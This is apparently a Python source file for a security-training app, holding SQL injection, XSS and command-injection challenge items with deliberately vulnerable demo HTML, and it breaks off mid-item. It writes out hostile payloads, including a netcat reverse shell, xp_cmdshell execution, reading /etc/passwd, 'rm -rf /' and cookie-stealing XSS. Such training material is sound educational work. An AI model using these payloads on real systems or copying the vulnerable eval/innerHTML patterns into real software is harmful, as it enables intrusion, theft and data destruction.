from flask import current_app
from bson import ObjectId
from datetime import datetime, timedelta
import csv
import os
import random
import json
import re
import hashlib


def get_db():
    """Get database connection from Flask app context."""
    try:
        return current_app.config['MONGO_CLIENT'].get_database()
    except Exception as e:
        # Fallback for direct access scenarios
        from pymongo import MongoClient
        import os
        mongo_uri = os.getenv('MONGO_URI', 'mongodb://localhost:27017/securetrainer')
        client = MongoClient(mongo_uri)
        return client.securetrainer


def add_challenge(data):
    """Add a new challenge to the database with validation."""
    db = get_db()
    
    # Validate required fields
    required_fields = ['challenge_id', 'category', 'difficulty', 'scenario', 'question', 'score_weight', 'type']
    for field in required_fields:
        if field not in data:
            raise ValueError(f"Missing required field: {field}")
    
    # Add metadata
    data.update({
        'created_at': datetime.now(),
        'active': True,
        '_id': data.get('challenge_id', str(ObjectId()))
    })
    
    # Validate challenge type
    valid_types = ['sql_injection', 'xss', 'command_injection', 'authentication', 'csrf']
    if data['type'] not in valid_types:
        raise ValueError(f"Invalid challenge type. Must be one of: {valid_types}")
    
    # Validate difficulty
    valid_difficulties = ['beginner', 'intermediate', 'advanced', 'expert']
    if data['difficulty'].lower() not in valid_difficulties:
        raise ValueError(f"Invalid difficulty. Must be one of: {valid_difficulties}")
    
    result = db.challenges.insert_one(data)
    return str(result.inserted_id)


def delete_challenge(challenge_id):
    """Soft delete a challenge by marking it as inactive."""
    db = get_db()
    result = db.challenges.update_one(
        {'_id': challenge_id},
        {'$set': {'active': False, 'deleted_at': datetime.now()}}
    )
    return result.modified_count > 0


def list_challenges(active_only=True):
    """List all challenges with optional filtering."""
    db = get_db()
    query = {'active': True} if active_only else {}
    challenges = list(db.challenges.find(query))
    
    # Convert ObjectId to string for JSON serialization
    for challenge in challenges:
        challenge['_id'] = str(challenge['_id'])
    
    return challenges


def load_sql_challenges():
    """Load SQL challenges from the CSV file."""
    challenges = []
    
    # Try to build path relative to current file
    try:
        # Get the path relative to the current file
        current_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.dirname(os.path.dirname(current_dir))
        csv_path = os.path.join(project_root, 'data', 'final_sqli_challenges_unique.csv')
    except:
        # If path construction fails, use fallback
        return get_fallback_sql_challenges()

    try:
        if os.path.exists(csv_path):
            with open(csv_path, encoding='utf-8') as file:
                reader = csv.DictReader(file)
                for row in reader:
                    try:
                        # Safely convert score_weight to int
                        score_weight = int(row.get('score_weight', 10))
                    except (ValueError, KeyError) as e:
                        print(f"Warning: Invalid score_weight for {row.get('id', 'unknown')}: {row.get('score_weight', 'missing')}. Using default 10.")
                        score_weight = 10
                    
                    # Get the ID and ensure it has sql_ prefix
                    raw_id = row.get('id', 'unknown')
                    if not raw_id.startswith('sql_'):
                        challenge_id = f"sql_{raw_id}"
                    else:
                        challenge_id = raw_id
                    
                    challenges.append({
                        'id': challenge_id,
                        'category': 'SQL Injection',
                        'payload': row.get('payload', ''),
                        'scenario': row.get('scenario', ''),
                        'question': row.get('question', ''),
                        'answer': row.get('answer', ''),
                        'hint': row.get('hint', ''),
                        'difficulty': row.get('difficulty', 'Beginner'),
                        'score_weight': score_weight,
                        'type': 'sql_injection'
                    })
            print(f"Loaded {len(challenges)} SQL challenges from CSV")
            return challenges
        else:
            print(f"CSV file not found at {csv_path}, using fallback challenges")
            return get_fallback_sql_challenges()
    except Exception as e:
        print(f"Error loading SQL challenges from CSV: {e}")
        import traceback
        traceback.print_exc()
        return get_fallback_sql_challenges()


def get_fallback_sql_challenges():
    """Return fallback SQL injection challenges."""
    return [
            {
            'id': 'sql_1',
                'category': 'SQL Injection',
                'difficulty': 'Beginner',
            'scenario': 'Login form that checks username and password without proper input validation.',
            'question': 'What would this payload do in a vulnerable system?',
            'payload': "' OR '1'='1' --",
            'hint': 'This makes the WHERE clause always true, bypassing authentication.',
            'score_weight': 10,
            'type': 'sql_injection',
            'answer': 'This payload bypasses authentication by making the WHERE clause always evaluate to true.',
            'expected_solutions': ["' OR '1'='1", "authentication bypass", "WHERE clause", "always evaluate", "always true"]
        },
        {
            'id': 'sql_2',
                'category': 'SQL Injection',
                'difficulty': 'Intermediate',
            'scenario': 'A search field where input is directly concatenated into SQL queries.',
            'question': 'What would this payload attempt to do if successful?',
            'payload': "; DROP TABLE users; --",
            'hint': 'The semicolon separates multiple SQL statements, allowing dangerous operations.',
            'score_weight': 20,
            'type': 'sql_injection',
            'answer': 'This payload attempts to drop the users table, causing data loss.',
            'expected_solutions': ["DROP TABLE", "data loss", "multiple statements", "semicolon"]
        },
        {
            'id': 'sql_3',
                'category': 'SQL Injection',
            'difficulty': 'Advanced',
            'scenario': 'Product search function that displays results from a database query.',
            'question': 'How does this attack attempt to extract sensitive information?',
                'payload': "' UNION SELECT username, password FROM users --",
            'hint': 'UNION combines the results of two queries, allowing access to other tables.',
            'score_weight': 30,
            'type': 'sql_injection',
            'answer': 'This payload uses UNION to combine results and extract user credentials.',
            'expected_solutions': ["UNION SELECT", "data extraction", "combine results", "user credentials"]
        },
        {
            'id': 'sql_4',
            'category': 'SQL Injection',
            'difficulty': 'Advanced',
            'scenario': 'A login page that returns generic error messages but has different response times.',
            'question': 'What type of SQL injection relies on response time delays?',
            'payload': "admin' AND SLEEP(5) --",
            'hint': 'This attack asks the database to pause before responding, confirming the injection.',
            'score_weight': 35,
            'type': 'sql_injection',
            'answer': 'Time-based Blind SQL Injection uses time delays to infer database information.',
            'expected_solutions': ["Time-based", "Blind SQL", "SLEEP", "delay", "response time"]
        },
        {
            'id': 'sql_5',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A system that only returns true/false responses without data.',
            'question': 'How can you extract data when you only get yes/no responses?',
            'payload': "admin' AND SUBSTRING(password,1,1)='a' --",
            'hint': 'You have to guess the data one character at a time by asking true/false questions.',
            'score_weight': 40,
            'type': 'sql_injection',
            'answer': 'Boolean-based Blind SQL Injection extracts data by asking true/false questions.',
            'expected_solutions': ["Boolean-based", "Blind SQL", "SUBSTRING", "true/false", "yes/no"]
        },
        {
            'id': 'sql_6',
            'category': 'SQL Injection',
            'difficulty': 'Intermediate',
            'scenario': 'An e-commerce site search function that displays product names.',
            'question': 'How can you determine the number of columns in a SELECT query?',
            'payload': "' ORDER BY 5 --",
            'hint': 'Use ORDER BY with increasing numbers until you get an error.',
            'score_weight': 25,
            'type': 'sql_injection',
            'answer': 'This payload uses ORDER BY to determine column count by incrementing the number until an error occurs.',
            'expected_solutions': ["ORDER BY", "column count", "determine", "enumerate", "error"]
        },
        {
            'id': 'sql_7',
            'category': 'SQL Injection',
            'difficulty': 'Advanced',
            'scenario': 'A news portal that displays articles based on category ID.',
            'question': 'How can you extract database version information?',
            'payload': "' UNION SELECT NULL,@@version,NULL --",
            'hint': '@@version is a MySQL function that returns database version information.',
            'score_weight': 35,
            'type': 'sql_injection',
            'answer': 'This payload extracts the database version using @@version function via UNION injection.',
            'expected_solutions': ["@@version", "database version", "UNION", "extract", "information"]
        },
        {
            'id': 'sql_8',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A corporate intranet with user profiles.',
            'question': 'How can you extract data from error messages?',
            'payload': "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users)) --",
            'hint': 'Error-based injection forces the database to display data in error messages.',
            'score_weight': 45,
            'type': 'sql_injection',
            'answer': 'Error-based SQL injection extracts data by forcing type conversion errors that reveal information.',
            'expected_solutions': ["error-based", "CONVERT", "type conversion", "extract", "error message"]
        },
        {
            'id': 'sql_9',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A secure login form with WAF (Web Application Firewall).',
            'question': 'How can you bypass WAF filters using encoding?',
            'payload': "admin'/**/OR/**/'1'='1'/**/--",
            'hint': 'Comments can bypass basic filters by breaking up keywords.',
            'score_weight': 50,
            'type': 'sql_injection',
            'answer': 'This payload uses inline comments to obfuscate SQL keywords and bypass WAF filters.',
            'expected_solutions': ["bypass", "WAF", "comment", "obfuscate", "filter evasion"]
        },
        {
            'id': 'sql_10',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A database backup tool with restricted access.',
            'question': 'How can you achieve Remote Code Execution through SQL?',
            'payload': "'; EXEC xp_cmdshell('whoami'); --",
            'hint': 'Some databases allow executing system commands through stored procedures.',
            'score_weight': 60,
            'type': 'sql_injection',
            'answer': 'This payload uses xp_cmdshell to execute OS commands through SQL injection, achieving RCE.',
            'expected_solutions': ["xp_cmdshell", "RCE", "remote code execution", "system command", "stored procedure"]
        }
    ]


def get_xss_challenges():
    """Return XSS challenges."""
    return [
        {
            'id': 'xss_1',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Beginner',
            'scenario': 'A comment system that displays user input without sanitization.',
            'question': 'What would this payload do when displayed on the page?',
            'payload': '<script>alert("XSS")</script>',
            'hint': 'Look at the HTML tags and think about what happens when they are rendered.',
            'score_weight': 15,
            'type': 'xss',
            'answer': 'This payload would execute JavaScript code, showing an alert popup.',
            'expected_solutions': ['alert', 'javascript', 'script', 'execute', 'popup'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Vulnerable Comment System Demo</h4>
                <div class="comment-box">
                    <p>User Comment: <span id="comment-display">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="comment-input" placeholder="Enter your comment..." />
                    <button onclick="displayComment()">Post Comment</button>
                </div>
            </div>
            <script>
                function displayComment() {
                    const input = document.getElementById('comment-input').value;
                    document.getElementById('comment-display').innerHTML = input;
                }
            </script>
            '''
        },
        {
            'id': 'xss_2',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Intermediate',
            'scenario': 'A profile page that shows user input in HTML context.',
            'question': 'How can you execute JavaScript without using script tags?',
            'payload': '<img src="x" onerror="alert(\'XSS\')">',
            'hint': 'Think about HTML attributes that can execute JavaScript code.',
            'score_weight': 25,
            'type': 'xss',
            'answer': 'This payload uses the onerror event handler to execute JavaScript when the image fails to load.',
            'expected_solutions': ['onerror', 'img', 'event handler', 'image', 'attribute'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Vulnerable Profile Page Demo</h4>
                <div class="profile-section">
                    <p>Bio: <span id="bio-display">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="bio-input" placeholder="Enter your bio..." />
                    <button onclick="updateBio()">Update Bio</button>
                </div>
            </div>
            <script>
                function updateBio() {
                    const input = document.getElementById('bio-input').value;
                    document.getElementById('bio-display').innerHTML = input;
                }
            </script>
            '''
        },
        {
            'id': 'xss_3',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Advanced',
            'scenario': 'A search results page that reflects user input.',
            'question': 'How can you bypass basic XSS filters?',
            'payload': '<svg onload="alert(1)">',
            'hint': 'SVG elements can have event handlers, and some filters miss them.',
            'score_weight': 35,
            'type': 'xss',
            'answer': 'This payload uses an SVG element with an onload event handler to bypass basic script tag filters.',
            'expected_solutions': ['svg', 'onload', 'bypass', 'filter', 'event'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Search Results with Basic Filter Demo</h4>
                <div class="search-results">
                    <p>Search results for: <span id="search-term">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="search-input" placeholder="Enter search term..." />
                    <button onclick="performSearch()">Search</button>
                </div>
                <div class="filter-info">
                    <small>Note: Basic filter removes &lt;script&gt; tags but may miss other elements</small>
                </div>
            </div>
            <script>
                function performSearch() {
                    const input = document.getElementById('search-input').value;
                    // Basic filter that removes script tags
                    const filtered = input.replace(/<script[^>]*>.*?<\/script>/gi, '');
                    document.getElementById('search-term').innerHTML = filtered;
                }
            </script>
            '''
        },
        {
            'id': 'xss_4',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A chat application that allows HTML input.',
            'question': 'How can you perform a stored XSS attack?',
            'payload': '<iframe src="javascript:alert(document.cookie)"></iframe>',
            'hint': 'Think about how to access sensitive information like cookies.',
            'score_weight': 45,
            'type': 'xss',
            'answer': 'This payload creates an iframe that executes JavaScript to access cookies, demonstrating stored XSS.',
            'expected_solutions': ['iframe', 'javascript:', 'cookie', 'stored', 'persistent'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Chat Application Demo</h4>
                <div class="chat-messages" id="chat-messages">
                    <div class="message">System: Welcome to the chat!</div>
                </div>
                <div class="input-section">
                    <input type="text" id="message-input" placeholder="Type your message..." />
                    <button onclick="sendMessage()">Send</button>
                </div>
                <div class="cookie-display">
                    <small>Current cookies: <span id="cookie-info">Loading...</span></small>
                </div>
            </div>
            <script>
                function sendMessage() {
                    const input = document.getElementById('message-input').value;
                    const chatMessages = document.getElementById('chat-messages');
                    const messageDiv = document.createElement('div');
                    messageDiv.className = 'message';
                    messageDiv.innerHTML = input;
                    chatMessages.appendChild(messageDiv);
                    document.getElementById('message-input').value = '';
                }
                
                // Display current cookies
                document.getElementById('cookie-info').textContent = document.cookie || 'No cookies';
            </script>
            '''
        },
        {
            'id': 'xss_5',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A form that uses innerHTML to display user input.',
            'question': 'How can you perform DOM-based XSS?',
            'payload': '<img src=x onerror=alert(1)>',
            'hint': 'DOM-based XSS occurs when JavaScript modifies the DOM based on user input.',
            'score_weight': 50,
            'type': 'xss',
            'answer': 'This payload uses DOM-based XSS by manipulating the innerHTML property to execute JavaScript.',
            'expected_solutions': ['dom', 'innerHTML', 'javascript', 'manipulation', 'client-side'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>DOM-based XSS Demo</h4>
                <div class="form-section">
                    <p>Form Data: <span id="form-data">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="form-input" placeholder="Enter form data..." />
                    <button onclick="processForm()">Process Form</button>
                </div>
                <div class="url-info">
                    <small>Try adding #<img src=x onerror=alert(1)> to the URL</small>
                </div>
            </div>
            <script>
                function processForm() {
                    const input = document.getElementById('form-input').value;
                    document.getElementById('form-data').innerHTML = input;
                }
                
                // Simulate URL hash-based XSS
                window.onhashchange = function() {
                    const hash = window.location.hash.substring(1);
                    if (hash) {
                        document.getElementById('form-data').innerHTML = decodeURIComponent(hash);
                    }
                };
            </script>
            '''
        },
        {
            'id': 'xss_6',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A page that reflects input inside a JavaScript variable.',
            'question': 'How can you break out of a JavaScript string context?',
            'payload': "'; alert(1); //",
            'hint': 'You need to close the string and the statement before injecting your code.',
            'score_weight': 50,
            'type': 'xss',
            'answer': 'This payload breaks out of the JavaScript string context to execute arbitrary code.',
            'expected_solutions': ['break out', 'string context', 'quote', 'semicolon', 'comment'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>JS Context Injection Demo</h4>
                <div class="script-context">
                    <p>Current User: <span id="user-display">Guest</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="user-input" placeholder="Enter username..." />
                    <button onclick="updateUser()">Update</button>
                </div>
            </div>
            <script>
                function updateUser() {
                    const input = document.getElementById('user-input').value;
                    // Vulnerable: input is directly injected into a JS string
                    try {
                        eval("var username = '" + input + "'; document.getElementById('user-display').textContent = username;");
                    } catch(e) {
                        console.log('Error:', e);
                    }
                }
            </script>
            '''
        },
        {
            'id': 'xss_7',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Advanced',
            'scenario': 'A markdown renderer that converts user input to HTML.',
            'question': 'How can you exploit markdown parsers with XSS?',
            'payload': '[Click me](javascript:alert(document.cookie))',
            'hint': 'Markdown link syntax can accept javascript: protocol handlers.',
            'score_weight': 40,
            'type': 'xss',
            'answer': 'This payload exploits markdown link syntax to execute JavaScript through the javascript: protocol.',
            'expected_solutions': ['markdown', 'javascript:', 'protocol', 'link', 'parser'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Markdown Renderer Demo</h4>
                <div class="preview" id="md-preview">Rendered content appears here...</div>
                <div class="input-section">
                    <textarea id="md-input" placeholder="Enter markdown..."></textarea>
                    <button onclick="renderMarkdown()">Render</button>
                </div>
            </div>
            <script>
                function renderMarkdown() {
                    const input = document.getElementById('md-input').value;
                    const preview = document.getElementById('md-preview');
                    // Simple markdown to HTML (vulnerable)
                    const html = input.replace(/\\[([^\\]]+)\\]\\(([^)]+)\\)/g, '<a href="$2">$1</a>');
                    preview.innerHTML = html;
                }
            </script>
            '''
        },
        {
            'id': 'xss_8',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A JSON API that reflects user data.',
            'question': 'How can you perform XSS through JSON responses?',
            'payload': '{"name":"<script>alert(1)</script>"}',
            'hint': 'If JSON responses are rendered as HTML without escaping, XSS is possible.',
            'score_weight': 45,
            'type': 'xss',
            'answer': 'This payload exploits improper JSON rendering by injecting script tags in JSON data.',
            'expected_solutions': ['JSON', 'API', 'response', 'rendering', 'escape'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>JSON API Demo</h4>
                <div class="api-response" id="json-display">API response will appear here...</div>
                <div class="input-section">
                    <input type="text" id="json-input" placeholder="Enter JSON name value..." />
                    <button onclick="fetchAPI()">Fetch API</button>
                </div>
            </div>
            <script>
                function fetchAPI() {
                    const input = document.getElementById('json-input').value;
                    const display = document.getElementById('json-display');
                    // Simulate JSON response
                    const json = {name: input, role: 'user'};
                    // Vulnerable rendering
                    display.innerHTML = `<p>Name: ${json.name}</p><p>Role: ${json.role}</p>`;
                }
            </script>
            '''
        },
        {
            'id': 'xss_9',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A rich text editor with sanitization.',
            'question': 'How can you bypass HTML sanitizers?',
            'payload': '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            'hint': 'HTML entity encoding can bypass some sanitization filters.',
            'score_weight': 50,
            'type': 'xss',
            'answer': 'This payload uses HTML entity encoding to obfuscate JavaScript and bypass sanitizers.',
            'expected_solutions': ['HTML entity', 'encoding', 'bypass', 'sanitizer', 'obfuscate'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Rich Text Editor Demo</h4>
                <div class="editor-preview" id="editor-preview">Preview appears here...</div>
                <div class="input-section">
                    <textarea id="editor-input" placeholder="Enter HTML content..."></textarea>
                    <button onclick="updateEditor()">Update</button>
                </div>
                <div class="filter-info">
                    <small>Sanitizer removes script tags but may miss encoded content</small>
                </div>
            </div>
            <script>
                function updateEditor() {
                    const input = document.getElementById('editor-input').value;
                    const preview = document.getElementById('editor-preview');
                    // Basic sanitizer (vulnerable to encoding)
                    const sanitized = input.replace(/<script[^>]*>.*?<\\/script>/gi, '');
                    preview.innerHTML = sanitized;
                }
            </script>
            '''
        },
        {
            'id': 'xss_10',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A CSS injection vulnerability in style attributes.',
            'question': 'How can you achieve XSS through CSS injection?',
            'payload': 'style="background:url(\'javascript:alert(1)\')"',
            'hint': 'CSS url() function can accept javascript: protocol in some browsers.',
            'score_weight': 55,
            'type': 'xss',
            'answer': 'This payload exploits CSS url() function to execute JavaScript through style attributes.',
            'expected_solutions': ['CSS injection', 'url()', 'style', 'javascript:', 'attribute'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>CSS Styling Demo</h4>
                <div id="styled-element">This element will be styled</div>
                <div class="input-section">
                    <input type="text" id="style-input" placeholder="Enter inline style..." />
                    <button onclick="applyStyle()">Apply Style</button>
                </div>
            </div>
            <script>
                function applyStyle() {
                    const input = document.getElementById('style-input').value;
                    const element = document.getElementById('styled-element');
                    element.setAttribute('style', input);
                }
            </script>
            '''
        }
    ]


def get_command_injection_challenges():
    """Return Command Injection challenges."""
    return [
        {
            'id': 'cmd_1',
            'category': 'Command Injection',
            'difficulty': 'Beginner',
            'scenario': 'A ping utility that takes user input for IP addresses.',
            'question': 'What would this payload do in a vulnerable system?',
            'payload': '127.0.0.1; ls',
            'hint': 'The semicolon separates commands in shell environments.',
            'score_weight': 20,
            'type': 'command_injection',
            'answer': 'This payload would ping localhost and then list directory contents.',
            'expected_solutions': ['ping', 'ls', 'semicolon', 'command', 'separator'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Vulnerable Ping Utility Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="ping-output">Ready to ping...</div>
                    <div class="terminal-input-line">
                        <span class="terminal-prefix">$</span>
                        <input type="text" id="ping-input" class="terminal-input" placeholder="Enter IP address..." />
                        <button onclick="executePing()">Execute</button>
                    </div>
                </div>
                <div class="warning">
                    <small>⚠️ This demo simulates command injection. In real systems, this could be dangerous!</small>
                </div>
            </div>
            <script>
                function executePing() {
                    const input = document.getElementById('ping-input').value;
                    const output = document.getElementById('ping-output');
                    
                    // Simulate command execution
                    if (input.includes(';')) {
                        const commands = input.split(';');
                        let result = `PING ${commands[0].trim()}: PONG\\n`;
                        if (commands.length > 1) {
                            result += `Executing: ${commands[1].trim()}\\n`;
                            result += `Directory listing:\\n`;
                            result += `file1.txt  file2.txt  file3.txt\\n`;
                        }
                        output.textContent = result;
                    } else {
                        output.textContent = `PING ${input}: PONG`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_2',
            'category': 'Command Injection',
            'difficulty': 'Intermediate',
            'scenario': 'A file upload system that processes filenames.',
            'question': 'How can you execute multiple commands?',
            'payload': 'file.txt && whoami',
            'hint': 'Think about logical operators in shell commands.',
            'score_weight': 30,
            'type': 'command_injection',
            'answer': 'This payload uses && to execute whoami only if the first command succeeds.',
            'expected_solutions': ['&&', 'whoami', 'logical', 'operator', 'conditional'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>File Upload System Demo</h4>
                <div class="upload-section">
                    <div class="file-info" id="file-info">No file selected</div>
                    <div class="terminal">
                        <div class="terminal-output" id="upload-output">Ready to process file...</div>
                    </div>
                </div>
                <div class="input-section">
                    <input type="text" id="filename-input" placeholder="Enter filename..." />
                    <button onclick="processFile()">Process File</button>
                </div>
                <div class="info">
                    <small>Try: file.txt && whoami</small>
                </div>
            </div>
            <script>
                function processFile() {
                    const input = document.getElementById('filename-input').value;
                    const fileInfo = document.getElementById('file-info');
                    const output = document.getElementById('upload-output');
                    
                    if (input.includes('&&')) {
                        const parts = input.split('&&');
                        fileInfo.textContent = `Processing file: ${parts[0].trim()}`;
                        output.textContent = `File processed successfully\\nExecuting: ${parts[1].trim()}\\nCurrent user: admin`;
                    } else {
                        fileInfo.textContent = `Processing file: ${input}`;
                        output.textContent = `File processed successfully`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_3',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A system monitoring tool that accepts hostnames.',
            'question': 'How can you bypass command injection filters?',
            'payload': '$(whoami)',
            'hint': 'Command substitution can execute commands within other commands.',
            'score_weight': 40,
            'type': 'command_injection',
            'answer': 'This payload uses command substitution to execute whoami and insert the result.',
            'expected_solutions': ['$()', 'substitution', 'bypass', 'filter', 'execute'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>System Monitoring Tool Demo</h4>
                <div class="monitoring-section">
                    <div class="terminal">
                        <div class="terminal-output" id="monitor-output">System monitoring ready...</div>
                    </div>
                </div>
                <div class="input-section">
                    <input type="text" id="hostname-input" placeholder="Enter hostname..." />
                    <button onclick="monitorHost()">Monitor Host</button>
                </div>
                <div class="filter-info">
                    <small>Note: Basic filters block semicolons and && but may miss $()</small>
                </div>
            </div>
            <script>
                function monitorHost() {
                    const input = document.getElementById('hostname-input').value;
                    const output = document.getElementById('monitor-output');
                    
                    if (input.includes('$(') && input.includes(')')) {
                        const command = input.match(/\\$\\(([^)]+)\\)/);
                        if (command) {
                            output.textContent = `Monitoring host: ${input}\\nExecuting: ${command[1]}\\nResult: admin\\nHost status: Online`;
                        }
                    } else {
                        output.textContent = `Monitoring host: ${input}\\nHost status: Online`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_4',
            'category': 'Command Injection',
            'difficulty': 'Expert',
            'scenario': 'A network diagnostic tool.',
            'question': 'How can you perform a reverse shell attack?',
            'payload': 'nc -e /bin/sh 192.168.1.100 4444',
            'hint': 'Netcat can be used to create network connections and execute shells.',
            'score_weight': 50,
            'type': 'command_injection',
            'answer': 'This payload attempts to create a reverse shell connection to an attacker-controlled system.',
            'expected_solutions': ['netcat', 'reverse', 'shell', 'connection', 'nc'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Network Diagnostic Tool Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="net-output">Network diagnostic ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="net-input" placeholder="Enter network command..." />
                    <button onclick="executeNetCommand()">Execute</button>
                </div>
                <div class="warning">
                    <small>⚠️ This demonstrates reverse shell techniques. Only use for authorized testing!</small>
                </div>
            </div>
            <script>
                function executeNetCommand() {
                    const input = document.getElementById('net-input').value;
                    const output = document.getElementById('net-output');
                    
                    if (input.includes('nc') && input.includes('-e')) {
                        output.textContent = `Executing: ${input}\\nAttempting reverse shell connection...\\nConnection failed (simulated)\\nThis would create a shell connection to the specified host`;
                    } else {
                        output.textContent = `Executing: ${input}\\nCommand completed`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_5',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A log viewer that accepts filenames.',
            'question': 'How can you chain commands using pipes?',
            'payload': 'log.txt | whoami',
            'hint': 'The pipe operator passes the output of one command to another.',
            'score_weight': 35,
            'type': 'command_injection',
            'answer': 'This payload uses the pipe operator to pass the file content (or empty output) to the whoami command.',
            'expected_solutions': ['pipe', '|', 'chain', 'output', 'redirect'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Log Viewer Demo</h4>
                <div class="log-output" id="log-display">
                    Select a log file to view...
                </div>
                <div class="input-section">
                    <input type="text" id="log-input" placeholder="Enter log filename..." />
                    <button onclick="viewLog()">View Log</button>
                </div>
            </div>
            <script>
                function viewLog() {
                    const input = document.getElementById('log-input').value;
                    const output = document.getElementById('log-display');
                    
                    if (input.includes('|')) {
                        const parts = input.split('|');
                        output.textContent = `Reading ${parts[0].trim()}...\\nPiping output to: ${parts[1].trim()}\\nResult: admin`;
                    } else {
                        output.textContent = `Reading content of ${input}...\\n[Log Data Displayed Here]`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_6',
            'category': 'Command Injection',
            'difficulty': 'Intermediate',
            'scenario': 'A backup script that accepts directory paths.',
            'question': 'How can you use backticks for command injection?',
            'payload': '/var/www/`whoami`',
            'hint': 'Backticks execute commands and substitute their output.',
            'score_weight': 30,
            'type': 'command_injection',
            'answer': 'This payload uses backticks for command substitution, executing whoami and inserting the result.',
            'expected_solutions': ['backticks', '`', 'substitution', 'execute', 'output'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Backup Script Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="backup-output">Ready to backup...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="backup-input" placeholder="Enter directory path..." />
                    <button onclick="runBackup()">Run Backup</button>
                </div>
            </div>
            <script>
                function runBackup() {
                    const input = document.getElementById('backup-input').value;
                    const output = document.getElementById('backup-output');
                    if (input.includes('`')) {
                        const match = input.match(/`([^`]+)`/);
                        if (match) {
                            output.textContent = `Backing up: /var/www/admin\\nExecuting: ${match[1]}\\nResult: admin`;
                        }
                    } else {
                        output.textContent = `Backing up: ${input}\\nBackup complete`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_7',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A web interface for managing services.',
            'question': 'How can you bypass input validation filters?',
            'payload': 'service;cat${IFS}/etc/passwd',
            'hint': 'Use environment variables like $IFS to bypass space filters.',
            'score_weight': 40,
            'type': 'command_injection',
            'answer': 'This payload uses $IFS (Internal Field Separator) to bypass space-blocking filters.',
            'expected_solutions': ['$IFS', 'bypass', 'filter', 'environment variable', 'space'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Service Manager Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="service-output">Service manager ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="service-input" placeholder="Enter service name..." />
                    <button onclick="manageService()">Manage</button>
                </div>
                <div class="filter-info">
                    <small>Filter blocks spaces but may miss ${IFS}</small>
                </div>
            </div>
            <script>
                function manageService() {
                    const input = document.getElementById('service-input').value;
                    const output = document.getElementById('service-output');
                    if (input.includes('${IFS}')) {
                        output.textContent = `Managing service: ${input.split(';')[0]}\\nExecuting: ${input.split(';')[1]}\\nReading /etc/passwd...`;
                    } else {
                        output.textContent = `Managing service: ${input}\\nService status: running`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_8',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A file conversion utility.',
            'question': 'How can you use wildcard injection?',
            'payload': '*.txt; rm -rf /',
            'hint': 'Wildcards expand to match filenames, potentially executing unintended commands.',
            'score_weight': 45,
            'type': 'command_injection',
            'answer': 'This payload uses wildcard expansion followed by command chaining to execute destructive commands.',
            'expected_solutions': ['wildcard', '*', 'expansion', 'rm', 'destructive'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>File Converter Demo</h4>
                <div class="file-list" id="file-list">Files: document.txt, report.txt</div>
                <div class="terminal">
                    <div class="terminal-output" id="convert-output">Ready to convert...</div>
